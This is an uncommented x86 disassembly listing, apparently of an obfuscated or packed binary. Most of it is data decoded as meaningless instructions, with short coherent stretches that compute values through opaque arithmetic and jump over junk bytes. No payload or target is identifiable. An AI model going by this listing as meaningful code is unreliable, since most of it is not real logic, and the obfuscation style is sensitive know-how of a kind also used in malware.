  40f129:	aaa    
  40f12a:	repz fld QWORD PTR [ecx]
  40f12d:	je     0x40f18e
  40f12f:	cli    
  40f130:	test   BYTE PTR gs:[ecx],cl
  40f133:	in     eax,dx
  40f134:	neg    BYTE PTR [eax-0x76]
  40f137:	xor    BYTE PTR [edx+0x6c],dh
  40f13a:	out    0xe5,eax
  40f13c:	jae    0x40f111
  40f13e:	or     cl,BYTE PTR [edi+ebp*8]
  40f141:	(bad)  
  40f142:	push   edi
  40f143:	cdq    
  40f144:	sub    al,0xd9
  40f146:	in     eax,dx
  40f147:	inc    edi
  40f148:	or     cl,BYTE PTR [ebp-0x2c]
  40f14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f14c:	lahf   
  40f14d:	(bad)  
  40f14f:	sbb    BYTE PTR [edi+0x39c4db2c],bl
  40f155:	and    DWORD PTR [edi],eax
  40f157:	sbb    DWORD PTR [esi+edx*2+0x764b8ac5],esp
  40f15e:	lahf   
  40f15f:	pop    ebx
  40f160:	into   
  40f161:	and    al,0x75
  40f163:	push   es
  40f164:	fisub  DWORD PTR ds:0x2d0105f3
  40f16a:	pop    es
  40f16b:	sar    DWORD PTR [eax+0x3a46ed66],cl
  40f171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f172:	inc    edi
  40f173:	ror    ebp,0x1f
  40f176:	xchg   ebx,eax
  40f177:	mov    ds:0x54216e21,al
  40f17c:	or     DWORD PTR [esi+0x73],esp
  40f17f:	mov    dh,ah
  40f181:	xchg   edi,eax
  40f182:	push   ss
  40f183:	in     al,dx
  40f184:	lds    esi,FWORD PTR [esi]
  40f186:	test   BYTE PTR [ecx-0x43],0x16
  40f18a:	dec    esi
  40f18b:	add    BYTE PTR [edi-0x7d],0xbc
  40f18f:	pop    ds
  40f190:	push   esp
  40f191:	push   ds
  40f192:	lea    ecx,[edi]
  40f194:	inc    esp
  40f195:	mov    ecx,ebp
  40f197:	jb     0x40f205
  40f199:	mov    eax,0xf6d52720
  40f19e:	xchg   edx,eax
  40f19f:	fisttp QWORD PTR [eax]
  40f1a1:	inc    esi
  40f1a2:	sub    bl,BYTE PTR [ebp-0x6f]
  40f1a5:	mov    ecx,DWORD PTR [ebx+0x7c]
  40f1a8:	or     ebx,ebx
  40f1aa:	sbb    BYTE PTR [eax+0x66],cl
  40f1ad:	imul   edx,DWORD PTR [esi+0x27fb090a],0xffffffd6
  40f1b4:	je     0x40f1b2
  40f1b6:	sub    DWORD PTR [eax+0x67],0x1822cfa3
  40f1bd:	adc    DWORD PTR ds:0xb66b7cc3,esp
  40f1c3:	xchg   ecx,eax
  40f1c4:	add    esp,DWORD PTR [eax-0x24]
  40f1c7:	das    
  40f1c8:	xchg   ebp,eax
  40f1c9:	int3   
  40f1ca:	scas   al,BYTE PTR es:[edi]
  40f1cb:	adc    BYTE PTR [edi+0x594f09fa],0xfd
  40f1d2:	or     ebx,DWORD PTR [edx]
  40f1d4:	sbb    al,BYTE PTR [eax]
  40f1d6:	mov    bl,0xed
  40f1d8:	push   0xeb419aef
  40f1dd:	pop    esi
  40f1de:	stc    
  40f1df:	add    edx,edi
  40f1e1:	ss mov ebx,0x2512349e
  40f1e7:	les    esp,FWORD PTR [ebx-0x13]
  40f1ea:	mul    DWORD PTR [edx-0x5e01daab]
  40f1f0:	jecxz  0x40f235
  40f1f2:	xchg   BYTE PTR [ecx+edx*4],bl
  40f1f5:	jbe    0x40f22f
  40f1f7:	sbb    DWORD PTR [ecx+esi*1-0x51],edx
  40f1fb:	add    DWORD PTR [ebx],edi
  40f1fd:	(bad)  
  40f1fe:	xlat   BYTE PTR ds:[ebx]
  40f1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f200:	cs sbb al,0x7a
  40f203:	add    al,0x7a
  40f205:	add    al,0x61
  40f207:	and    dl,BYTE PTR [ebp-0x3d]
  40f20a:	test   eax,0xa15c314c
  40f20f:	sub    eax,0x76584a49
  40f214:	fiadd  WORD PTR [eax]
  40f216:	in     eax,0x9
  40f218:	adc    BYTE PTR [ebp+0x1f95a59f],al
  40f21e:	jecxz  0x40f1b4
  40f220:	out    0xa7,eax
  40f222:	fadd   st(3),st
  40f224:	dec    ebp
  40f225:	fwait
  40f226:	test   bl,bh
  40f228:	rol    DWORD PTR [ecx-0x23d4415e],cl
  40f22e:	mov    gs,WORD PTR [edx]
  40f230:	or     BYTE PTR [ebp-0x7f],ch
  40f233:	cli    
  40f234:	cmp    DWORD PTR [edi-0x68],esp
  40f237:	mov    ebx,0xb43a88a2
  40f23c:	xor    esi,DWORD PTR ds:0xe72403ab
  40f242:	test   DWORD PTR [ebp+esi*1+0x5b],0x2e08e36b
  40f24a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f24b:	pop    ebx
  40f24c:	mov    esi,0x6b30f36
  40f251:	scas   al,BYTE PTR es:[edi]
  40f252:	(bad)  
  40f253:	int3   
  40f254:	lods   al,BYTE PTR ds:[esi]
  40f255:	xadd   BYTE PTR [ebp+0x2],bh
  40f259:	popf   
  40f25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f25b:	popa   
  40f25c:	clc    
  40f25d:	icebp  
  40f25e:	fcomp  QWORD PTR [eax-0x3eaf7ea0]
  40f264:	lea    ebx,[ebp+0x30]
  40f267:	xchg   ecx,eax
  40f268:	cmc    
  40f269:	mov    ds:0xe3029abf,eax
  40f26e:	mov    edx,0xdbe77810
  40f273:	xchg   esi,eax
  40f274:	std    
  40f275:	jle    0x40f2ac
  40f277:	sbb    eax,0x3d063a30
  40f27c:	dec    edi
  40f27d:	inc    esi
  40f27e:	sub    ecx,DWORD PTR [ebx+eiz*2+0x695e2a71]
  40f285:	jns    0x40f26c
  40f287:	mov    al,ds:0x39bc9b5
  40f28c:	sar    dh,1
  40f28e:	nop    edx
  40f291:	xor    esi,esi
  40f293:	je     0x40f2e9
  40f295:	clc    
  40f296:	jecxz  0x40f252
  40f298:	pop    edx
  40f299:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f29b:	sahf   
  40f29c:	test   DWORD PTR [edi+ebx*8+0x4990e0fe],eax
  40f2a3:	dec    esp
  40f2a4:	jle    0x40f268
  40f2a6:	loopne 0x40f24d
  40f2a8:	scas   eax,DWORD PTR es:[edi]
  40f2a9:	pop    esp
  40f2aa:	ss ror cl,1
  40f2ad:	(bad)  
  40f2ae:	sub    al,0x87
  40f2b0:	cli    
  40f2b1:	push   esi
  40f2b2:	(bad)  
  40f2b3:	lods   eax,DWORD PTR ds:[esi]
  40f2b4:	adc    BYTE PTR [ebx],ah
  40f2b6:	or     dh,dl
  40f2b8:	jne    0x40f287
  40f2ba:	adc    al,0x9e
  40f2bc:	pusha  
  40f2bd:	call   0xf73f2c21
  40f2c2:	or     ebp,ebx
  40f2c4:	mov    ds:0x41345478,al
  40f2c9:	and    eax,0xbc90548a
  40f2ce:	add    eax,0x35f0dbec
  40f2d3:	cmp    al,0x9d
  40f2d5:	xor    eax,0xf2c88fa4
  40f2da:	jnp    0x40f2ad
  40f2dc:	jbe    0x40f30f
  40f2de:	jmp    0x205298d3
  40f2e3:	jge    0x40f312
  40f2e5:	lahf   
  40f2e6:	pop    ecx
  40f2e7:	inc    edx
  40f2e8:	or     BYTE PTR [edx+0x11],dh
  40f2eb:	mov    al,0x26
  40f2ed:	test   al,0xa6
  40f2ef:	dec    eax
  40f2f0:	xchg   ecx,eax
  40f2f1:	and    BYTE PTR [eax],dh
  40f2f3:	rcr    DWORD PTR [ebp-0x2e97d070],1
  40f2f9:	pop    ebp
  40f2fa:	iret   
  40f2fb:	cmp    edx,DWORD PTR [edi-0x24913640]
  40f301:	mov    esp,0xc3ab8efb
  40f306:	add    edi,esp
  40f308:	xchg   ecx,eax
  40f309:	fs jmp 0x101148f7
  40f30f:	in     al,0xc
  40f311:	pushf  
  40f312:	mov    eax,0x5f648dc6
  40f317:	test   BYTE PTR [eax],ch
  40f319:	push   0x30b01fe0
  40f31e:	and    DWORD PTR [ecx],0xffffffb9
  40f321:	leave  
  40f322:	sar    DWORD PTR [edx+0x35],1
  40f325:	out    0xc4,eax
  40f327:	sub    eax,ebx
  40f329:	jbe    0x40f32f
  40f32b:	sub    DWORD PTR [ebx+ecx*4],eax
  40f32e:	cdq    
  40f32f:	sahf   
  40f330:	mov    ds:0x6e621d1,eax
  40f335:	icebp  
  40f336:	enter  0xae3d,0xf3
  40f33a:	stos   DWORD PTR es:[edi],eax
  40f33b:	sahf   
  40f33c:	in     eax,dx
  40f33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f33e:	mov    al,0xaa
  40f340:	ds cwde 
  40f342:	mov    ch,0x16
  40f344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f345:	mov    dl,0xae
  40f347:	push   0xd1074a7c
  40f34c:	pushf  
  40f34d:	pop    edx
  40f34e:	xor    DWORD PTR [edi+0x5e],esi
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0xfffffffc
  40f384:	ss jg  0x40f337
  40f387:	sub    ebp,DWORD PTR [eax+0x14be1818]
  40f38d:	sbb    BYTE PTR [eax],bl
  40f38f:	icebp  
  40f390:	gs mov bh,0x2f
  40f393:	pop    edx
  40f394:	and    eax,0x58b9fa38
  40f399:	outs   dx,DWORD PTR ds:[esi]
  40f39a:	stc    
  40f39b:	into   
  40f39c:	mov    dl,cl
  40f39e:	dec    esp
  40f39f:	out    0x30,eax
  40f3a1:	mov    cl,BYTE PTR [ebx-0x365c7945]
  40f3a7:	xor    eax,0xd1ade06c
  40f3ac:	sub    DWORD PTR fs:[edi+esi*1],ebp
  40f3b0:	scas   eax,DWORD PTR es:[edi]
  40f3b1:	jl     0x40f423
  40f3b3:	xor    bl,0xa
  40f3b6:	sub    eax,0xb74d9a5b
  40f3bb:	xor    al,0xe7
  40f3bd:	adc    ah,BYTE PTR [edi-0xb3ba0e]
  40f3c3:	pop    edx
  40f3c4:	inc    edx
  40f3c5:	xlat   BYTE PTR ds:[ebx]
  40f3c6:	add    DWORD PTR [edi+ebp*8-0x26],ecx
  40f3ca:	rol    BYTE PTR [eax-0x1],cl
  40f3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ce:	fist   WORD PTR [ecx+0x6c]
  40f3d1:	lahf   
  40f3d2:	mov    ebp,0x8a8b14cd
  40f3d7:	push   esi
  40f3d8:	add    BYTE PTR [edx+0x48],al
  40f3db:	sub    dh,BYTE PTR [esi+0x7065e821]
  40f3e1:	ss pop edi
  40f3e3:	ja     0x40f38c
  40f3e5:	mov    esp,0xc1c1ed5d
  40f3ea:	mov    ds:0x7e8dd235,eax
  40f3ef:	adc    DWORD PTR [edi+0x75],ebx
  40f3f2:	pop    edx
  40f3f3:	sub    esp,edi
  40f3f5:	mov    WORD PTR [ecx-0x67],ss
  40f3f8:	add    esi,ebp
  40f3fa:	dec    esp
  40f3fb:	(bad)  
  40f3fd:	mov    WORD PTR [ecx-0x6e],cs
  40f400:	or     DWORD PTR [edi-0x35],edi
  40f403:	jae    0x40f469
  40f405:	sbb    al,0xd5
  40f407:	(bad)  
  40f408:	xchg   edx,eax
  40f409:	and    al,0x8b
  40f40b:	bound  ecx,QWORD PTR [ecx-0x6f]
  40f40e:	mov    ds:0x2d2adaf5,eax
  40f413:	aam    0x16
  40f415:	iret   
  40f416:	sti    
  40f417:	adc    dh,BYTE PTR [ecx+esi*8]
  40f41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41b:	inc    WORD PTR [ebx+0x6]
  40f41f:	inc    esi
  40f420:	cmp    BYTE PTR ds:0x90a50550,dl
  40f426:	mov    al,ds:0x15800c4e
  40f42b:	js     0x40f3d0
  40f42d:	sbb    al,0xf9
  40f42f:	pop    ebp
  40f430:	nop
  40f431:	and    eax,eax
  40f433:	popf   
  40f434:	cmp    BYTE PTR [ebx-0x58bd1745],0x30
  40f43b:	scas   al,BYTE PTR es:[edi]
  40f43c:	jl     0x40f3d3
  40f43e:	mov    dh,0xbd
  40f440:	test   eax,0x80ecf69e
  40f445:	mov    eax,edi
  40f447:	stos   BYTE PTR es:[edi],al
  40f448:	and    ah,BYTE PTR [esi+ecx*2-0x37]
  40f44c:	ss xchg ecx,eax
  40f44e:	pusha  
  40f44f:	jae    0x40f4a4
  40f451:	in     eax,0x5f
  40f453:	cli    
  40f454:	push   ss
  40f455:	mov    ch,0xaf
  40f457:	fcom   QWORD PTR [ecx-0x1a]
  40f45a:	mov    bh,0x26
  40f45c:	add    dh,ch
  40f45e:	xchg   ebp,eax
  40f45f:	xchg   esi,eax
  40f460:	test   al,0x19
  40f462:	call   0x5ccb13f1
  40f467:	fwait
  40f468:	mov    cl,0x55
  40f46a:	out    0xcc,eax
  40f46c:	std    
  40f46d:	call   0x23ad:0xb9be6e0f
  40f474:	sub    bl,dh
  40f476:	or     BYTE PTR [ebp+0x15],bh
  40f479:	adc    DWORD PTR [eax+0x6cdcd6b6],ebp
  40f47f:	in     eax,dx
  40f480:	adc    ebx,esp
  40f482:	adc    eax,0x7fd522fa
  40f487:	cld    
  40f488:	clc    
  40f489:	daa    
  40f48a:	dec    ebp
  40f48b:	cmc    
  40f48c:	sbb    al,0x1a
  40f48e:	in     al,dx
  40f48f:	or     bh,BYTE PTR [edi-0x5]
  40f492:	dec    edx
  40f493:	addr16 ret 0x9ae
  40f497:	cmp    esp,DWORD PTR [edi+0x4f]
  40f49a:	xchg   BYTE PTR [eax-0x37],bl
  40f49d:	sahf   
  40f49e:	dec    esp
  40f49f:	xor    eax,0x768ba372
  40f4a4:	push   ebx
  40f4a5:	or     al,0x12
  40f4a7:	and    BYTE PTR [edi+0x64],0x29
  40f4ab:	in     al,dx
  40f4ac:	pop    ss
  40f4ad:	retf   0xbbac
  40f4b0:	or     DWORD PTR [ebx+edx*4-0x70],eax
  40f4b4:	sub    eax,0x530910c5
  40f4b9:	mov    dl,0x52
  40f4bb:	push   ss
  40f4bc:	or     al,0x73
  40f4be:	xchg   edi,eax
  40f4bf:	ss mov bl,0x2a
  40f4c2:	std    
  40f4c3:	jns    0x40f4ad
  40f4c5:	js     0x40f515
  40f4c7:	xor    eax,0xaa59c6b4
  40f4cc:	pop    edx
  40f4cd:	push   ss
  40f4ce:	cwde   
  40f4cf:	jno    0x40f534
  40f4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d2:	push   edx
  40f4d3:	push   ds
  40f4d4:	imul   eax,ecx,0xffffffd8
  40f4d7:	imul   esi,DWORD PTR [ecx],0x49
  40f4da:	jae    0x40f4d2
  40f4dc:	ret    
  40f4dd:	ds sub ch,bl
  40f4e0:	test   BYTE PTR [eax-0x4b820409],dh
  40f4e6:	adc    eax,0xbda17766
  40f4eb:	leave  
  40f4ec:	or     DWORD PTR [edx-0x74619b24],edx
  40f4f2:	int3   
  40f4f3:	adc    BYTE PTR [eax+0x34fc2f6b],bl
  40f4f9:	fistp  DWORD PTR [ebx-0x4caad0d3]
  40f4ff:	hlt    
  40f500:	in     eax,dx
  40f501:	sahf   
  40f502:	shr    DWORD PTR [ebp-0x5f866b58],cl
  40f508:	das    
  40f509:	out    dx,al
  40f50a:	push   ss
  40f50b:	pop    es
  40f50c:	scas   al,BYTE PTR es:[edi]
  40f50d:	not    edx
  40f50f:	cmp    edi,ecx
  40f511:	sub    DWORD PTR [edi+0x65],ebp
  40f514:	mov    ebx,0xbd289b3e
  40f519:	sbb    al,cl
  40f51b:	jbe    0x40f52c
  40f51d:	ins    DWORD PTR es:[edi],dx
  40f51e:	and    al,0x89
  40f520:	or     ebx,DWORD PTR [edx-0x6f0b68c]
  40f526:	add    DWORD PTR [esi+0x604d09e3],ebx
  40f52c:	loop   0x40f57d
  40f52e:	add    eax,0x2f681dc7
  40f533:	pop    eax
  40f534:	cmp    ebp,DWORD PTR [eax+0x612a3a3b]
  40f53a:	jb     0x40f4e2
  40f53c:	in     eax,0x88
  40f53e:	loope  0x40f591
  40f540:	pop    es
  40f541:	push   ecx
  40f542:	out    dx,eax
  40f543:	les    esp,FWORD PTR [ecx-0xf]
  40f546:	xchg   DWORD PTR [ebx-0x30ea35d],edi
  40f54c:	retw   
  40f54e:	out    0x1a,al
  40f550:	and    al,0x74
  40f552:	push   es
  40f553:	aad    0x93
  40f555:	sbb    DWORD PTR [eax+esi*8-0x62],ebp
  40f559:	xchg   ebx,eax
  40f55a:	mov    WORD PTR [ecx+ebx*1],?
  40f55d:	mov    edx,0x994ef1fd
  40f562:	sub    eax,edi
  40f564:	outs   dx,BYTE PTR ds:[esi]
  40f565:	adc    eax,0x6a08d202
  40f56a:	test   eax,0x7a9b9405
  40f56f:	sub    DWORD PTR [ebx-0x55],esp
  40f572:	sbb    eax,ebp
  40f574:	adc    BYTE PTR [esi+eax*8],0xba
  40f578:	cmp    esi,DWORD PTR [ecx+0x1e253109]
  40f57e:	mov    ds:0x11e4805c,eax
  40f583:	shl    DWORD PTR [esi],0x2f
  40f586:	test   eax,0x6f390ce5
  40f58b:	add    al,0xa9
  40f58d:	jge    0x40f5aa
  40f58f:	or     esi,ebp
  40f591:	es in  eax,dx
  40f593:	pop    esp
  40f594:	sub    BYTE PTR [ecx],bl
  40f596:	push   ebp
  40f597:	repz int3 
  40f599:	jmp    0xe416dccf
  40f59e:	sub    dl,BYTE PTR [edx+ebp*1]
  40f5a1:	add    edi,edi
  40f5a3:	pop    edi
  40f5a4:	mov    al,ds:0x2c65ab09
  40f5a9:	test   al,0x9e
  40f5ab:	or     cl,BYTE PTR [eax-0x3f]
  40f5ae:	ret    0x81b0
  40f5b1:	push   0x49
  40f5b3:	jno    0x40f5d2
  40f5b5:	addr16 test al,0x44
  40f5b8:	aas    
  40f5b9:	imul   DWORD PTR [eax+0x39]
  40f5bc:	push   ss
  40f5bd:	cmp    bh,ah
  40f5bf:	leave  
  40f5c0:	jne    0x40f5d8
  40f5c2:	pop    ds
  40f5c3:	fiadd  WORD PTR ds:0xa323433f
  40f5c9:	and    eax,0xf7935d71
  40f5ce:	fidivr DWORD PTR [ebp+0x26]
  40f5d1:	(bad)  
  40f5d2:	scas   al,BYTE PTR es:[edi]
  40f5d3:	out    dx,al
  40f5d4:	jle    0x40f612
  40f5d6:	dec    edi
  40f5d7:	cmp    bh,BYTE PTR [eax+ebp*2]
  40f5da:	(bad)
  40f5de:	mov    ecx,0xc9c69862
  40f5e3:	push   eax
  40f5e4:	jl     0x40f5e4
  40f5e6:	jmp    0x147:0x241b8a9b
  40f5ed:	dec    ebp
  40f5ee:	ss inc ebx
  40f5f0:	mov    BYTE PTR [eax+0x6b],ch
  40f5f3:	mov    ds:0xe4b53420,al
  40f5f8:	pop    edx
  40f5f9:	out    dx,eax
  40f5fa:	mov    esp,0x327a93ea
  40f5ff:	or     dh,cl
  40f601:	and    BYTE PTR [edi],0x39
  40f604:	sub    al,0xd0
  40f606:	pop    ecx
  40f607:	pop    ebp
  40f608:	(bad)  
  40f609:	scas   al,BYTE PTR es:[edi]
  40f60a:	dec    eax
  40f60b:	cwde   
  40f60c:	sbb    BYTE PTR [ebp-0x48b45145],bl
  40f612:	pop    esp
  40f613:	and    edi,DWORD PTR [edi+0x7]
  40f616:	and    esi,DWORD PTR [edx-0x1]
  40f619:	push   es
  40f61a:	and    ch,BYTE PTR [eax]
  40f61c:	aam    0xf6
  40f61e:	or     ecx,esp
  40f620:	pop    esi
  40f621:	outs   dx,DWORD PTR ds:[esi]
  40f622:	jle    0x40f66b
  40f624:	xor    DWORD PTR [edx],ebx
  40f626:	mov    ds:0x26173c4c,eax
  40f62b:	dec    esi
  40f62c:	cld    
  40f62d:	movzx  edx,BYTE PTR ds:0x2c81a71e
  40f634:	sub    esp,DWORD PTR es:[ecx]
  40f637:	imul   esi,ebx,0x339336b2
  40f63d:	jo     0x40f5c4
  40f63f:	cdq    
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422548
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42267c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x4f50147c],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	adc    DWORD PTR [esi+0xfa73174],edx
  40f737:	cmp    DWORD PTR [eax],ebx
  40f739:	int    0x74
  40f73b:	(bad)  
  40f73d:	dec    ebp
  40f73e:	lods   al,BYTE PTR ds:[esi]
  40f73f:	and    BYTE PTR [ebx-0x59f17d1],dl
  40f745:	bound  edi,QWORD PTR [ebx-0x7b7f7597]
  40f74b:	mov    ebp,0xc3868f4a
  40f750:	adc    DWORD PTR ds:0x9eb2fd03,0x4c
  40f757:	scas   al,BYTE PTR es:[edi]
  40f758:	adc    BYTE PTR fs:[eax-0x21e42870],cl
  40f75f:	pushf  
  40f760:	jno    0x40f6f6
  40f762:	std    
  40f763:	paddw  mm6,mm2
  40f766:	cmp    bl,ch
  40f768:	mov    bl,0xc6
  40f76a:	xor    esi,DWORD PTR [ecx-0x60]
  40f76d:	mov    edi,0x87e6c562
  40f772:	ja     0x40f727
  40f774:	fistp  DWORD PTR [edi-0x38cf9fc4]
  40f77a:	pop    eax
  40f77b:	cs mov edx,0x99811060
  40f781:	cmp    DWORD PTR [edx+0x40],ecx
  40f784:	lea    ebp,[eax+0x7f]
  40f787:	into   
  40f788:	push   0x4d
  40f78a:	lods   al,BYTE PTR ds:[esi]
  40f78b:	loop   0x40f740
  40f78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f78e:	popa   
  40f78f:	jno    0x40f7f9
  40f791:	xor    eax,0x244a9c06
  40f796:	js     0x40f790
  40f798:	mov    ebx,0xef7bd79d
  40f79d:	pop    esi
  40f79f:	ret    
  40f7a0:	push   eax
  40f7a1:	nop
  40f7a2:	cdq    
  40f7a3:	imul   ecx,DWORD PTR [ebx+0x5b3700d9],0xb075f914
  40f7ad:	cdq    
  40f7ae:	cmp    eax,0x1061d5c5
  40f7b3:	adc    edx,DWORD PTR [esi]
  40f7b5:	(bad)  
  40f7b6:	pop    esi
  40f7b7:	dec    edx
  40f7b8:	sub    DWORD PTR [ebp-0x23],ebp
  40f7bb:	and    DWORD PTR [ecx-0x7d523cc8],ebx
  40f7c1:	aad    0x67
  40f7c3:	ficom  DWORD PTR [ecx]
  40f7c5:	jmp    0x40f7c3
  40f7c7:	scas   eax,DWORD PTR es:[edi]
  40f7c8:	addr16 push eax
  40f7ca:	es rcr bh,1
  40f7cd:	repnz in al,0xf4
  40f7d0:	and    eax,0xee1e1686
  40f7d5:	fstp   st(3)
  40f7d7:	lea    ebp,[esi+0x19]
  40f7da:	jge    0x40f7cb
  40f7dc:	pop    eax
  40f7dd:	fs call 0x82f6:0x28dd12f
  40f7e5:	jle    0x40f7d3
  40f7e7:	les    esp,FWORD PTR [eax-0x57e77cf4]
  40f7ed:	ins    BYTE PTR es:[edi],dx
  40f7ee:	pop    esi
  40f7ef:	fmul   QWORD PTR [esi+0x47]
  40f7f2:	cmc    
  40f7f3:	(bad)  
  40f7f4:	ficom  WORD PTR [eax+0x61]
  40f7f7:	scas   eax,DWORD PTR es:[edi]
  40f7f8:	mov    bh,0x25
  40f7fa:	icebp  
  40f7fb:	jae    0x40f824
  40f7fd:	inc    edx
  40f7fe:	lods   eax,DWORD PTR ds:[esi]
  40f7ff:	test   al,0xc8
  40f801:	cmp    ah,ah
  40f803:	imul   ebx,DWORD PTR [ebp+0x3cee9ba0],0xffffffa7
  40f80a:	mov    ecx,0x890662f2
  40f80f:	ds xor al,0xe4
  40f812:	or     ebp,DWORD PTR ss:[ebx-0x5d]
  40f816:	cmp    dl,BYTE PTR [ebx+eiz*4]
  40f819:	xchg   edi,eax
  40f81a:	or     BYTE PTR [edi+0xe],ah
  40f81d:	shr    DWORD PTR [ecx-0xf45366f],cl
  40f823:	inc    ecx
  40f824:	cwde   
  40f825:	pop    ss
  40f826:	xchg   edi,eax
  40f827:	jmp    0x40f7f9
  40f829:	dec    edi
  40f82a:	push   esp
  40f82b:	push   esi
  40f82c:	and    BYTE PTR [ecx+0x4d],ch
  40f82f:	(bad)  
  40f830:	fidivr WORD PTR [ecx-0x5718b0af]
  40f836:	add    DWORD PTR [edi+ebx*2-0x1c],ebp
  40f83a:	test   DWORD PTR [ecx+ecx*8-0x24],esi
  40f83e:	mov    ds:0xc6267873,al
  40f843:	pusha  
  40f844:	outs   dx,DWORD PTR ds:[esi]
  40f845:	mov    esp,0x6eff9149
  40f84a:	std    
  40f84b:	pop    edx
  40f84c:	sbb    esp,eax
  40f84e:	pop    edx
  40f84f:	mov    cl,0x42
  40f851:	mov    ebp,0xb07acfda
  40f856:	pop    ebp
  40f857:	jl     0x40f8ad
  40f859:	stos   BYTE PTR es:[edi],al
  40f85a:	push   esi
  40f85b:	out    0x52,al
  40f85d:	xchg   ecx,eax
  40f85e:	mov    ebx,0xcff5f06a
  40f863:	push   ebp
  40f864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f865:	loopne 0x40f8c1
  40f867:	(bad)  
  40f868:	jno    0x40f8ad
  40f86a:	adc    ebp,edx
  40f86c:	repz aaa 
  40f86e:	jecxz  0x40f864
  40f870:	ds popa 
  40f872:	xor    al,0xa3
  40f874:	jns    0x40f82c
  40f876:	sar    DWORD PTR [esi-0xe],0x9a
  40f87a:	push   esp
  40f87b:	or     eax,0xdb22afdb
  40f880:	sub    eax,0x8970a950
  40f885:	inc    ebp
  40f886:	(bad)  
  40f887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f888:	cmp    eax,0x5d99472b
  40f88d:	dec    eax
  40f88e:	pop    eax
  40f88f:	sbb    al,0x97
  40f891:	pop    eax
  40f892:	lods   eax,DWORD PTR ds:[esi]
  40f893:	sbb    bh,bh
  40f895:	out    dx,eax
  40f896:	pop    ss
  40f897:	pop    ss
  40f898:	loopne 0x40f85d
  40f89a:	repnz test eax,0xdbbbc62c
  40f8a0:	inc    esp
  40f8a1:	sub    DWORD PTR ds:0x9e56a6f8,edx
  40f8a7:	out    0xfe,al
  40f8a9:	jge    0x40f869
  40f8ab:	cdq    
  40f8ac:	mov    dh,0x33
  40f8ae:	dec    edx
  40f8af:	scas   al,BYTE PTR es:[edi]
  40f8b0:	ja     0x40f8bc
  40f8b2:	push   ss
  40f8b3:	mov    cl,0x1
